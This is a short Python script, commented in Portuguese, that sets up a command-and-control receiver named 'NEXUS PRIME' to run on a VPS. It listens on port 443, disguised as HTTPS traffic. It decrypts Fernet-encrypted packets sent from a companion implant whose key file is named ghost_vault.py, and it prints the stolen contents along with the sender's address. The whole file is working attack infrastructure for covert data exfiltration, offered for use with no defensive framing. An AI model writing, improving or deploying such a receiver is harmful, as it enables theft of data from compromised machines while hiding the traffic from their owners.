# [ARQUIVO: nexus_c2.py] - RODAR NA VPS
import socket
from cryptography.fernet import Fernet

# Use a MESMA CHAVE que você gerou no ghost_vault.py
CHAVE_MESTRA = b'SUA_CHAVE_AQUI_IGUAL_DO_NEXUS'
cipher = Fernet(CHAVE_MESTRA)

def iniciar_receptor():
    # Escuta na porta 443 (mascarado como HTTPS)
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('0.0.0.0', 443))
    servidor.listen(5)
    print("🛡️ C2 NEXUS PRIME: Escutando na Porta 443... [STATUS: GHOST]")

    while True:
        cliente, addr = servidor.accept()
        dados_cifrados = cliente.recv(4096)
        
        try:
            # Descriptografa o que o Nexus enviou
            dados_reais = cipher.decrypt(dados_cifrados).decode()
            print(f"📦 PACOTE RECEBIDO DE {addr}:")
            print(f"🔍 CONTEÚDO: {dados_reais}")
        except Exception as e:
            print(f"⚠️ Erro ao descriptografar: {e}")
        finally:
            cliente.close()

if __name__ == "__main__":
    iniciar_receptor()
